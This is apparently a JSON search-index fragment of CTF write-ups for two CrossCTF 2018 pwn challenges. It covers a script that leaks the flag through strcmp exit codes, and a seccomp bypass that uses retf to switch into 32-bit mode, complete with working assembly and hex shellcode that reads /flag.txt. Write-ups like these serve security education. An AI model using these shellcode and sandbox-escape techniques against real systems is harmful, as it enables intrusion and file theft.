(pwn)"},{"location":"/crossctf-quals2018/pwn/evenflow/#challenge","text":"We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write( Flag: ) sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write( Shell: ) sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system( ./evenflow + flag + ; echo \\ + shell + \\ ); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen( flag , r ); size_t file_size = get_file_size( flag ); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other.","title":"Challenge"},{"location":"/crossctf-quals2018/pwn/evenflow/#exploit","text":"","title":"Exploit"},{"location":"/crossctf-quals2018/pwn/evenflow/#_1","text":"In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag.","title":"$?"},{"location":"/crossctf-quals2018/pwn/evenflow/#script","text":"We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to 0 , # Then adjust it based on the output of strcmp (the exit code) # e.g. to C , then add a 0 = C0 # and repeat till we get } , the end of the flag s = 0 while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Script"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/","text":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn) The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - jarsp (@jarsp) Challenge Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A = 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL SECCOMP We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this). retf However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!). Exploit The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline( \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2 + \\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd + \\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31 + \\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83 + \\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd + \\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0 + \\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83 + \\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff + \\xff + /flag.txt\\x00 ) Finally, print(p.recv()) to get the flag.","title":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/#impossible-shellcoding-crossctf-quals-2018-pwn","text":"The flag is at /flag.txt. nc ctf.pwn.sg 7123 Creator - jarsp (@jarsp)","title":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/#challenge","text":"Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A = 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL","title":"Challenge"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/#seccomp","text":"We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this).","title":"SECCOMP"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/#retf","text":"However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!).","title":"retf"},{"location":"/crossctf-quals2018/pwn/impossible_shellcoding/#exploit","text":"The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline( \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2 + \\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd + \\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31 + \\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83 + \\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd + \\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0 + \\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83 + \\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff + \\xff + /flag.txt\\x00 ) Finally, print(p.recv()) to get the flag.","title":"Exploit"}]}